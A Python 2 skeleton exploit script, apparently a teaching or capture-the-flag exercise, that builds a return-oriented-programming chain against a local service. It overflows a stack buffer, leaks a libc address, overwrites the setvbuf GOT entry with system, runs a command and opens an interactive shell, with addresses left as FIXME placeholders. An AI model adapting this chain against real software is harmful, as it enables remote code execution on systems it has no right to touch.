#!/usr/bin/env python

# ROP - HARD - SKELETON EXPLOIT

import socket
import struct
import telnetlib
import time

# address of the name buffer holding our command
namebuf_bss = 0x0 #FIXME

# the command we're passing to system
command = "" #FIXME

# the length of the stack buffer we're overflowing + the size of the saved ebp
paddinglength = 0x400 #FIXME

# offset of the function setvbuf in target's libc 
libc_setvbuf_off = 0x0 #FIXME

# offset of the function system in target's libc
libc_system_off = 0x0 #FIXME

# address of the got entry for setvbuf
setvbuf_got = 0x0 #FIXME

# address of the function write's plt stub
write_plt = 0x0 #FIXME

# address of the function read's plt stub
read_plt = 0x0 #FIXME

# address of the function setvbuf's plt stub
setvbuf_plt = 0x0 #FIXME

# address of a pop pop pop ret gadget
pppr = 0x0 #FIXME

p = lambda v: struct.pack("<I", v)
u = lambda v: struct.unpack("<I", v)[0]

def interact():
	''' allow the user to interact with the stream directly, like netcat '''
	print "*** interact ***"
	t = telnetlib.Telnet()
	t.sock = s
	t.interact()

def runtil(mesg, debug=False):
	''' read from the socket until mesg is found '''
	buf = ""
	while mesg not in buf:
		c = s.recv(1)
		if len(c) > 0 and debug:
			print c.encode('hex')
		buf += c

	return buf

s = socket.create_connection(("localhost", 3000))

# we get asked for a name here

runtil(": ")

# the name is placed into a global buffer, unaffected by ASLR
# we'll use this space to store a command we pass to system

s.send("rop me\n")

# now we are asked for a bio. this is where the vulnerability exists
# as there is no limit to how much data we can send. this data is stored
# on the stack and we can overflow this buffer to overwrite the saved 
# return address

runtil(":\n")

# Our binary is protected by NX pages and ASLR. This means we cannot
# execute data on the stack, like a traditional (read oldschool) 
# stacksmashing attack. Additionally because of ASLR we do not know 
# at what address our stack is placed at. We'll use ROP (return-oriented 
# programming) to bypass both of these defenses

payload  = "A"*paddinglength # padding up to the saved return address

# leak a libc address
payload += p(write_plt)      # call write(1, setvbuf_got, 4)
payload += p(pppr)           # we return into pop pop pop ret
														 # this clears the args to write, and allows us to chain
													   # another call

payload += p(1)              # 1 is stdout's filedescriptor
payload += p(setvbuf_got)    # we're leaking the address of setvbuf in libc
payload += p(4)              # the address is 4 bytes

# read in a new address over the GOT
payload += p(read_plt)       # call read(0, setvbuf_got, 4)
payload += p(pppr)           # return into pop pop pop ret
payload += p(0)              # 0 is stdin's filedescriptor
payload += p(setvbuf_got)    # we're writing over setvbuf's got entry
payload += p(4)              # the address is 4 bytes

# read our command back into the bss, so we have an addressable string with 
# the command we want
payload += p(read_plt)       # call read(0, namebuf_bss, <command_length>)
payload += p(pppr)           # return into pop pop pop ret
payload += p(0)              # 0 is stdin's filedescriptor
payload += p(namebuf_bss)    # we're writing to the bss, because we know it's 
                             #address
payload += p(len(command)+1) # we know how much we want to read

# at this point setvbuf will point to the address of system in the 
# target's copy of libc. all calls to setvbuf are actually calls to system.
# call system using setvbuf's hijacked GOT entry
payload += p(setvbuf_plt)    # call system(name)
payload += "JUNK"
payload += p(namebuf_bss)

# send our chain to smash the stack and return to system with namebuf as an arg
s.send(payload + "\n")

# give our payload enough time to execute
time.sleep(1)

# now we read in the setvbuf libc leak
leak = s.recv(4096)

# trim the leak, grabing the bytes, unpacking them and calculating libc's 
# base address
libc_base = u(leak[-4:]) - libc_setvbuf_off

# calculate the address of system in libc
libc_system = libc_base + libc_system_off

# send the setvbuf's new address over, writing over setvbuf's got entry
s.send(p(libc_system))

# finally, send in the command we want to execute
s.send(command)


# a shell should now be dropped
interact()
